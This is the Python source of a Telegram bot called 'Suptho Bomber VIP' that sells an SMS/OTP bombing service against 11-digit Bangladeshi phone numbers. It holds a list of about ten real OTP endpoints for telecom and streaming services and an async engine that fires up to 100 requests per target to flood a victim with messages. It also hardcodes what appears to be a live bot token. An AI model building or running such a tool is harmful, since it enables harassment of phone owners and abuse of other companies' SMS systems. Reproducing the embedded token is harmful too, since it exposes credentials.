import telebot
import asyncio
import aiohttp
import threading
import time
import os
import json
import random
import string
from flask import Flask
from telebot import types

# ==========================================
# 🌐 WEB SERVER (For Render)
# ==========================================
app = Flask('')
@app.route('/')
def home(): return "Supreme Turbo Bot is Running!"

def run_web_server():
    port = int(os.environ.get("PORT", 10000))
    app.run(host='0.0.0.0', port=port)

def keep_alive():
    threading.Thread(target=run_web_server, daemon=True).start()

# ==========================================
# 🔧 CONFIGURATION (Sothik ID o Token din)
# ==========================================
API_TOKEN = '8577991344:AAFyp9TUo-BrzgUpO1ZRoy6fjnc41hBG4GM'  # <--- Bot Token din
OWNER_ID = 6941003064              # <--- Apnar numeric ID din
OWNER_NAME = "Suptho Hpd"
CHANNEL_ID = "@SH_tricks"         
DATA_FILE = 'bot_db.json'

bot = telebot.TeleBot(API_TOKEN)

# ==========================================
# 💾 DATABASE MANAGER
# ==========================================
def load_data():
    if not os.path.exists(DATA_FILE):
        return {"users": {}, "codes": [], "whitelist": [], "banned": []}
    try:
        with open(DATA_FILE, 'r') as f: return json.load(f)
    except: return {"users": {}, "codes": [], "whitelist": [], "banned": []}

def save_data(data):
    with open(DATA_FILE, 'w') as f: json.dump(data, f, indent=4)

db = load_data()

# ==========================================
# 🚀 ASYNC FAST API ENGINE (The Speed Secret)
# ==========================================
async def async_hit(session, url, method, data=None, json_data=None):
    try:
        headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"}
        if method == "POST":
            async with session.post(url, data=data, json=json_data, headers=headers, timeout=3) as resp:
                return await resp.text()
        else:
            async with session.get(url, headers=headers, timeout=3) as resp:
                return await resp.text()
    except: return None

async def start_async_bombing(target, amount):
    apis = [
        ("https://api-dynamic.chorki.com/v2/auth/login?country=BD&platform=web", "POST", None, {"number": "+88"+target}),
        (f"https://www.bioscopelive.com/en/login/send-otp?phone=88{target}", "GET", None, None),
        (f"https://api.hoichoi.tv/users/otp?phone={target}&country_code=880", "GET", None, None),
        ("https://api.apex4u.com/api/auth/login", "POST", None, {"phoneNumber": target}),
        ("https://shopbasebd.com/store/registration/sendOTP", "POST", {"number": target, "_token": "ktrqcmKSAn8cP3vZvw3xkbav2ww65eRvaikWKDFo"}, None),
        ("https://web-api.banglalink.net/api/v1/user/otp-login/request", "POST", None, {"mobile": target}),
        ("https://webloginda.grameenphone.com/backend/api/v1/otp", "POST", {"msisdn": target}, None),
        ("https://api.shadhinmusic.com/api/v1/auth/otp?phone={target}", "GET", None, None),
        ("https://api.shikho.com/auth/v2/send/sms", "POST", None, {"phone": "88"+target, "type": "student"}),
        ("https://api.ostad.app/api/v2/user/with-otp", "POST", None, {"msisdn": target})
    ]
    
    async with aiohttp.ClientSession() as session:
        tasks = []
        count = 0
        while count < amount:
            for url, method, data, json_data in apis:
                if count >= amount: break
                tasks.append(async_hit(session, url, method, data, json_data))
                count += 1
        await asyncio.gather(*tasks)

# ==========================================
# 🤖 BOT COMMANDS (Admin Fixed)
# ==========================================
def is_joined(user_id):
    try:
        res = bot.get_chat_member(CHANNEL_ID, user_id)
        return res.status in ['member', 'administrator', 'creator']
    except: return False

@bot.message_handler(commands=['start'])
def welcome(message):
    uid = str(message.from_user.id)
    if uid not in db['users']:
        db['users'][uid] = {"credits": 5}
        save_data(db)
    
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
    markup.add("🚀 Start Bomb", "💳 My Balance", "👥 Refer & Earn", "💰 Redeem Credit")
    bot.send_message(message.chat.id, "🔥 **SUPTHO BOMBER VIP** 🔥\nWelcome Master!", reply_markup=markup, parse_mode='Markdown')

# --- Admin Panel Fixed ---
@bot.message_handler(commands=['admin', 'gencodes', 'stats'])
def admin_panel(message):
    if message.from_user.id != OWNER_ID:
        return bot.reply_to(message, "❌ Access Denied!")
    
    cmd = message.text.split()
    if cmd[0] == '/admin':
        bot.send_message(message.chat.id, "👑 **Admin Commands:**\n`/stats` - User Info\n`/gencodes 10` - Generate Codes", parse_mode='Markdown')
    elif cmd[0] == '/stats':
        bot.reply_to(message, f"📊 Total Users: {len(db['users'])}\n🎟️ Codes: {len(db['codes'])}")
    elif cmd[0] == '/gencodes':
        try:
            num = int(cmd[1])
            codes = ["SUP-" + ''.join(random.choices(string.ascii_uppercase + string.digits, k=7)) for _ in range(num)]
            db['codes'].extend(codes); save_data(db)
            bot.reply_to(message, f"✅ Generated:\n`{', '.join(codes)}`", parse_mode='Markdown')
        except: bot.reply_to(message, "Use: `/gencodes 5`")

# --- Bombing Logic ---
@bot.message_handler(func=lambda m: True)
def handle_buttons(message):
    if not is_joined(message.from_user.id):
        return bot.reply_to(message, f"❌ Join {CHANNEL_ID} first!")

    if message.text == "🚀 Start Bomb":
        msg = bot.reply_to(message, "💣 Target Number (11 Digit):")
        bot.register_next_step_handler(msg, ask_amount)
    elif message.text == "💳 My Balance":
        uid = str(message.from_user.id)
        cred = "Unlimited" if int(uid) == OWNER_ID else db['users'].get(uid, {}).get('credits', 0)
        bot.reply_to(message, f"💰 Balance: {cred} Credits")

def ask_amount(message):
    target = message.text.strip()
    if len(target) != 11: return bot.reply_to(message, "❌ Invalid Number!")
    msg = bot.reply_to(message, f"🎯 Target: {target}\n🔢 Amount (Max 100):")
    bot.register_next_step_handler(msg, process_bomb, target)

def process_bomb(message, target):
    uid = str(message.from_user.id)
    try:
        amount = int(message.text)
        if amount > 100: amount = 100
        
        if int(uid) != OWNER_ID:
            if db['users'][uid]['credits'] < 1: return bot.reply_to(message, "⚠️ No Credits!")
            db['users'][uid]['credits'] -= 1; save_data(db)
        
        bot.send_message(message.chat.id, f"🚀 **Async Bombing Started!**\nTarget: {target}")
        
        # Async loop running in a thread
        loop = asyncio.new_event_loop()
        threading.Thread(target=lambda: loop.run_until_complete(start_async_bombing(target, amount))).start()
        
        bot.send_message(message.chat.id, f"✅ **Attack Finished!** Sent: {amount}")
    except: bot.reply_to(message, "❌ Error.")

if __name__ == "__main__":
    try: bot.remove_webhook()
    except: pass
    keep_alive()
    bot.polling(non_stop=True)
